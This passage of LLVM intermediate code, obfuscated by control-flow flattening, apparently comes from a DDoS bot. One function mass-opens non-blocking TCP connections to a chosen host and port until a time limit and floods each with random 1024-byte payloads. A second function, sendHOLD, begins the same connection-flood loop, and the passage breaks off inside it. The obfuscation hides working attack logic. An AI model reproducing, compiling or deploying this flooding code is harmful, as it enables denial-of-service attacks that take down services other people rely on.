    i32 167640496, label %99
    i32 -547633751, label %104
    i32 -1328171508, label %111
    i32 1019594362, label %116
    i32 -1779249389, label %117
    i32 697595866, label %118
    i32 2079472965, label %127
    i32 -1449643016, label %128
    i32 -1299097625, label %160
    i32 2124785883, label %171
    i32 -137590771, label %182
    i32 128874776, label %187
    i32 -1818682939, label %188
    i32 -700899160, label %192
    i32 -824556559, label %203
    i32 -1037003474, label %204
    i32 898657367, label %205
    i32 194511105, label %216
    i32 500148271, label %221
    i32 -1422164072, label %232
    i32 852463446, label %NewDefault
    i32 237862242, label %233
    i32 -951917323, label %234
    i32 1520760261, label %237
    i32 591187911, label %238
    i32 -212944338, label %240
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp ne i32 %.reload, 0
  %31 = select i1 %30, i32 2100088934, i32 -225262844
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -212944338, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %35 = getelementptr inbounds [8 x i8], [8 x i8]* %34, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 8, i32 4, i1 false)
  %36 = load i32, i32* %7, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %10, align 8
  %39 = alloca %struct.state_t, i64 %37, align 16
  store %struct.state_t* %39, %struct.state_t** %.reg2mem6
  %.reload26 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %40 = bitcast %struct.state_t* %.reload26 to i8*
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 %43, i32 16, i1 false)
  %44 = call noalias i8* @malloc(i64 1024) #2
  store i8* %44, i8** %16, align 8
  %45 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 1024, i32 1, i1 false)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %46, %47
  store i32 %48, i32* %17, align 4
  store i32 914960120, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %17, align 4
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %52 = icmp sgt i32 %50, %51
  %53 = select i1 %52, i32 1380362092, i32 591187911
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 -148596308, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %8, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp slt i32 %56, %57
  %59 = select i1 %58, i32 1751035593, i32 1520760261
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %.reload25 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload25, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  store i32 %66, i32* %.reg2mem27
  store i32 1029596869, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem27
  %Pivot4 = icmp slt i32 %.reload31, 1
  %67 = select i1 %Pivot4, i32 1767683324, i32 591395189
  store i32 %67, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload29 = load volatile i32, i32* %.reg2mem27
  %Pivot = icmp slt i32 %.reload29, 2
  %68 = select i1 %Pivot, i32 -1779249389, i32 -1688871905
  store i32 %68, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload28 = load volatile i32, i32* %.reg2mem27
  %SwitchLeaf2 = icmp eq i32 %.reload28, 2
  %69 = select i1 %SwitchLeaf2, i32 898657367, i32 852463446
  store i32 %69, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem27
  %SwitchLeaf = icmp eq i32 %.reload30, 0
  %70 = select i1 %SwitchLeaf, i32 1684353079, i32 852463446
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %.reload24 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload24, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  store i32 %72, i32* %76, align 8
  %77 = load i32, i32* %8, align 4
  %78 = sext i32 %77 to i64
  %.reload23 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload23, i64 %78
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %79, i32 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = load i32, i32* %8, align 4
  %83 = sext i32 %82 to i64
  %.reload22 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %84 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload22, i64 %83
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 8
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i8* null)
  %88 = or i32 %87, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 4, i32 %88)
  %90 = load i32, i32* %8, align 4
  %91 = sext i32 %90 to i64
  %.reload21 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload21, i64 %91
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %92, i32 0, i32 0
  %94 = load i32, i32* %93, align 8
  %95 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %96 = call i32 @connect(i32 %94, %struct.sockaddr* %95, i32 16)
  %97 = icmp ne i32 %96, -1
  %98 = select i1 %97, i32 -547633751, i32 167640496
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = call i32* @__errno_location() #13
  %101 = load i32, i32* %100, align 4
  %102 = icmp ne i32 %101, 115
  %103 = select i1 %102, i32 -547633751, i32 -1328171508
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32, i32* %8, align 4
  %106 = sext i32 %105 to i64
  %.reload20 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload20, i64 %106
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = call i32 @close(i32 %109)
  store i32 1019594362, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  %113 = sext i32 %112 to i64
  %.reload19 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %114 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload19, i64 %113
  %115 = getelementptr inbounds %struct.state_t, %struct.state_t* %114, i32 0, i32 1
  store i8 1, i8* %115, align 4
  store i32 1019594362, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 237862242, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  store i32 697595866, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %119, i64 0, i64 0
  %121 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %120) #2, !srcloc !6
  %122 = extractvalue { i64, i64* } %121, 0
  %123 = extractvalue { i64, i64* } %121, 1
  %124 = trunc i64 %122 to i32
  store i32 %124, i32* %18, align 4
  %125 = ptrtoint i64* %123 to i64
  %126 = trunc i64 %125 to i32
  store i32 %126, i32* %19, align 4
  store i32 2079472965, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  store i32 -1449643016, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %.reload18 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload18, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = srem i32 %133, 64
  %135 = zext i32 %134 to i64
  %136 = shl i64 1, %135
  %137 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %.reload17 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload17, i64 %139
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = sdiv i32 %142, 64
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [16 x i64], [16 x i64]* %137, i64 0, i64 %144
  %146 = load i64, i64* %145, align 8
  %147 = or i64 %146, %136
  store i64 %147, i64* %145, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %148, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %.reload16 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload16, i64 %151
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = add nsw i32 %154, 1
  %156 = call i32 @select(i32 %155, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %156, i32* %15, align 4
  %157 = load i32, i32* %15, align 4
  %158 = icmp eq i32 %157, 1
  %159 = select i1 %158, i32 -1299097625, i32 -1818682939
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %161 = load i32, i32* %8, align 4
  %162 = sext i32 %161 to i64
  %.reload15 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %163 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload15, i64 %162
  %164 = getelementptr inbounds %struct.state_t, %struct.state_t* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 8
  %166 = bitcast i32* %14 to i8*
  %167 = call i32 @getsockopt(i32 %165, i32 1, i32 4, i8* %166, i32* %13) #2
  %168 = load i32, i32* %14, align 4
  %169 = icmp ne i32 %168, 0
  %170 = select i1 %169, i32 2124785883, i32 -137590771
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %172 = load i32, i32* %8, align 4
  %173 = sext i32 %172 to i64
  %.reload14 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %174 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload14, i64 %173
  %175 = getelementptr inbounds %struct.state_t, %struct.state_t* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 8
  %177 = call i32 @close(i32 %176)
  %178 = load i32, i32* %8, align 4
  %179 = sext i32 %178 to i64
  %.reload13 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %180 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload13, i64 %179
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %180, i32 0, i32 1
  store i8 0, i8* %181, align 4
  store i32 128874776, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %8, align 4
  %184 = sext i32 %183 to i64
  %.reload12 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %185 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload12, i64 %184
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %185, i32 0, i32 1
  store i8 2, i8* %186, align 4
  store i32 128874776, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  store i32 -1037003474, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i32, i32* %15, align 4
  %190 = icmp eq i32 %189, -1
  %191 = select i1 %190, i32 -700899160, i32 -824556559
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i32, i32* %8, align 4
  %194 = sext i32 %193 to i64
  %.reload11 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload11, i64 %194
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 8
  %198 = call i32 @close(i32 %197)
  %199 = load i32, i32* %8, align 4
  %200 = sext i32 %199 to i64
  %.reload10 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload10, i64 %200
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %201, i32 0, i32 1
  store i8 0, i8* %202, align 4
  store i32 -824556559, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  store i32 -1037003474, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  store i32 237862242, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %206, i32 1024)
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %.reload9 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload9, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = load i8*, i8** %16, align 8
  %213 = call i64 @send(i32 %211, i8* %212, i64 1024, i32 16384)
  %214 = icmp eq i64 %213, -1
  %215 = select i1 %214, i32 194511105, i32 -1422164072
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = call i32* @__errno_location() #13
  %218 = load i32, i32* %217, align 4
  %219 = icmp ne i32 %218, 11
  %220 = select i1 %219, i32 500148271, i32 -1422164072
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* %8, align 4
  %223 = sext i32 %222 to i64
  %.reload8 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %224 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload8, i64 %223
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %224, i32 0, i32 0
  %226 = load i32, i32* %225, align 8
  %227 = call i32 @close(i32 %226)
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %.reload7 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload7, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 1
  store i8 0, i8* %231, align 4
  store i32 -1422164072, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 237862242, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 237862242, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 -951917323, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i32, i32* %8, align 4
  %236 = add nsw i32 %235, 1
  store i32 %236, i32* %8, align 4
  store i32 -148596308, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 914960120, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %239)
  store i32 -212944338, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %238, %237, %234, %233, %NewDefault, %232, %221, %216, %205, %204, %203, %192, %188, %187, %182, %171, %160, %128, %127, %118, %117, %116, %111, %104, %99, %71, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %60, %55, %54, %49, %33, %32, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %.reg2mem29 = alloca i32
  %.reg2mem6 = alloca %struct.state_t*
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  store i32 %31, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1912039568, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 -1912039568, label %first
    i32 -1959251075, label %34
    i32 1826758398, label %35
    i32 -1026010168, label %51
    i32 -1041307732, label %56
    i32 -109298889, label %57
    i32 1264557489, label %62
    i32 -191337785, label %NodeBlock3
    i32 348233460, label %NodeBlock
    i32 1578615625, label %LeafBlock1
    i32 807841752, label %LeafBlock
    i32 -1481542276, label %73
    i32 2126440612, label %101
    i32 -543808896, label %106
    i32 -2031940957, label %113
    i32 1168623633, label %118
    i32 591264977, label %119
    i32 1495532300, label %120
    i32 197508400, label %129
    i32 -1419049348, label %130
    i32 -304454362, label %162
    i32 -1416158762, label %173
    i32 45062955, label %184
    i32 1087579607, label %189
    i32 -971787741, label %190
    i32 -1048656520, label %194
    i32 -1742314575, label %205
    i32 -1142307706, label %206
    i32 322315929, label %207
    i32 761031310, label %208
    i32 1504536913, label %217
    i32 95902391, label %218
    i32 -1597713565, label %250
    i32 -636365827, label %261
    i32 1958891284, label %NewDefault
    i32 -872560000, label %262
    i32 1572905326, label %263
    i32 1030719276, label %266
    i32 2090779916, label %267
    i32 1448290921, label %269
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %32 = icmp ne i32 %.reload, 0
  %33 = select i1 %32, i32 -1959251075, i32 1826758398
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1448290921, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store %struct.state_t* %41, %struct.state_t** %.reg2mem6
  %.reload28 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %42 = bitcast %struct.state_t* %.reload28 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 %45, i32 16, i1 false)
  %46 = call noalias i8* @malloc(i64 1024) #2
  store i8* %46, i8** %16, align 8
  %47 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 1024, i32 1, i1 false)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %48, %49
  store i32 %50, i32* %17, align 4
  store i32 -1026010168, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %17, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  %55 = select i1 %54, i32 -1041307732, i32 2090779916
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 -109298889, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  %61 = select i1 %60, i32 1264557489, i32 1030719276
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %8, align 4
  %64 = sext i32 %63 to i64
  %.reload27 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload27, i64 %64
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %65, i32 0, i32 1
  %67 = load i8, i8* %66, align 4
  %68 = zext i8 %67 to i32
  store i32 %68, i32* %.reg2mem29
  store i32 -191337785, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload33 = load volatile i32, i32* %.reg2mem29
  %Pivot4 = icmp slt i32 %.reload33, 1
  %69 = select i1 %Pivot4, i32 807841752, i32 348233460
  store i32 %69, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem29
  %Pivot = icmp slt i32 %.reload31, 2
  %70 = select i1 %Pivot, i32 591264977, i32 1578615625
  store i32 %70, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem29
  %SwitchLeaf2 = icmp eq i32 %.reload30, 2
  %71 = select i1 %SwitchLeaf2, i32 322315929, i32 1958891284
  store i32 %71, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload32 = load volatile i32, i32* %.reg2mem29
  %SwitchLeaf = icmp eq i32 %.reload32, 0
  %72 = select i1 %SwitchLeaf, i32 -1481542276, i32 1958891284
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %.reload26 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload26, i64 %76
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %77, i32 0, i32 0
  store i32 %74, i32* %78, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %.reload25 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload25, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %.reload24 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload24, i64 %85
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %88, i32 3, i8* null)
  %90 = or i32 %89, 2048
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 4, i32 %90)
  %92 = load i32, i32* %8, align 4
  %93 = sext i32 %92 to i64
  %.reload23 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %94 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload23, i64 %93
  %95 = getelementptr inbounds %struct.state_t, %struct.state_t* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %98 = call i32 @connect(i32 %96, %struct.sockaddr* %97, i32 16)
  %99 = icmp ne i32 %98, -1
  %100 = select i1 %99, i32 -543808896, i32 2126440612
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32* @__errno_location() #13
  %103 = load i32, i32* %102, align 4
  %104 = icmp ne i32 %103, 115
  %105 = select i1 %104, i32 -543808896, i32 -2031940957
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %8, align 4
  %108 = sext i32 %107 to i64
  %.reload22 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload22, i64 %108
  %110 = getelementptr inbounds %struct.state_t, %struct.state_t* %109, i32 0, i32 0
  %111 = load i32, i32* %110, align 8
  %112 = call i32 @close(i32 %111)
  store i32 1168623633, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %8, align 4
  %115 = sext i32 %114 to i64
  %.reload21 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %116 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload21, i64 %115
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %116, i32 0, i32 1
  store i8 1, i8* %117, align 4
  store i32 1168623633, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 -872560000, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 1495532300, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %121, i64 0, i64 0
  %123 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %122) #2, !srcloc !7
  %124 = extractvalue { i64, i64* } %123, 0
  %125 = extractvalue { i64, i64* } %123, 1
  %126 = trunc i64 %124 to i32
  store i32 %126, i32* %18, align 4
  %127 = ptrtoint i64* %125 to i64
  %128 = trunc i64 %127 to i32
  store i32 %128, i32* %19, align 4
  store i32 197508400, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 -1419049348, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %8, align 4
  %132 = sext i32 %131 to i64
  %.reload20 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload20, i64 %132
  %134 = getelementptr inbounds %struct.state_t, %struct.state_t* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 8
  %136 = srem i32 %135, 64
  %137 = zext i32 %136 to i64
  %138 = shl i64 1, %137
  %139 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %140 = load i32, i32* %8, align 4
